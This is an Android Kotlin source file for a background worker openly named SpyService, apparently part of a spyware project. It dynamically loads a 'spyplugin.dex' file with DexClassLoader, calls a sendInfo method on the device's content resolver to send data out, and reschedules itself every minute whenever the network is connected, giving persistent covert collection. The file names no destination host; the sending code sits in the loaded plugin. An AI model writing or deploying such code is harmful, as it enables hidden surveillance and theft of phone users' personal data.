package com.example.background

import android.content.Context
import android.util.Log
import androidx.work.Constraints
import androidx.work.CoroutineWorker
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.WorkerParameters
import dalvik.system.DexClassLoader
import java.io.File
import java.util.concurrent.TimeUnit

class SpyService(appContext: Context, workerParams: WorkerParameters)
    : CoroutineWorker(appContext, workerParams) {

    private val TAG = "SPY_JOB"

    override suspend fun doWork(): Result {
        return try {
            val file = File(applicationContext.codeCacheDir, "spyplugin.dex")
            val infoProvider = loadDex(applicationContext, file)
            val success = infoProvider.sendInfo(applicationContext.contentResolver)
            if (success) {
                Log.d(TAG, "Success send info")
            } else {
                Log.d(TAG, "Fail send info")
            }

            val constrains = Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED)
                .build()
            val nextWork = OneTimeWorkRequestBuilder<SpyService>()
                .setInitialDelay(1, TimeUnit.MINUTES)
                .addTag("SPYJOB")
                .setConstraints(constrains)
                .build()
            WorkManager.getInstance(applicationContext).enqueue(nextWork)
            Result.success()
        } catch (e: Exception) {
            Log.d(TAG, "exception service", e)
            Result.failure()
        }
    }

    fun loadDex(context: Context, dexFile: File): InfoProvider {

        val optimizedDir = context.codeCacheDir

        val classLoader = DexClassLoader(
            dexFile.absolutePath,
            optimizedDir.absolutePath,
            null,
            context.classLoader
        )

        val clazz = classLoader.loadClass("com.example.spyplugin.InfoProviderClass")
        val instance = clazz.newInstance() as InfoProvider

        return instance
    }
}